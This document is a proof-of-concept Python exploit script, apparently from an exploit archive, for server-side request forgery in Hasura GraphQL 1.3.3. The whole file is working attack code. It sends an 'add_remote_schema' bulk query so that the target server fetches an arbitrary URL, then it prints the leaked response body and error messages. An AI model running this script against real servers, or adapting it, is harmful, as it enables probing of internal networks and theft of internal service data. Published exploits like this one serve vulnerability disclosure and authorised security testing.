# Exploit Title: Hasura GraphQL - Service Side Request Forgery (SSRF)
# Software: Hasura GraphQL
# Software Link: https://github.com/hasura/graphql-engine
# Version: 1.3.3
# Author: Dolev Farhi
# Date: 4.19.2021
# Tested on: Ubuntu

import requests

HASURA_SCHEME = 'http'
HASURA_HOST = '192.168.1.1'
HASURA_PORT = 80

REMOTE_URL = 'http://some_remote_addr'

def SSRF(url):
  data = {
    "type":"bulk",
    "args":[
      {
       "type":"add_remote_schema",
       "args":{
         "name":"test",
         "definition":{
           "url":url,
           "headers":[],
           "timeout_seconds":60,
           "forward_client_headers":True
           }
         }
       }
      ]
    }
  endpoint = '{}://{}:{}/v1/query'.format(HASURA_SCHEME, HASURA_HOST, HASURA_PORT)
  r = requests.post(endpoint, json=data)
  return r.json()

res = SSRF(REMOTE_URL)

message = ''
raw_body = ''

try:
  if 'message' in res['internal']:
    message = res['internal'].get('message', '')
  if 'raw_body' in res['internal']:
    raw_body = res['internal'].get('raw_body', '')
except:
  pass

print('Remote URL: ' + REMOTE_URL)
print('Message: ' + message)
print('HTTP Raw Body: ' + raw_body)
print('Error: ' + res['error'])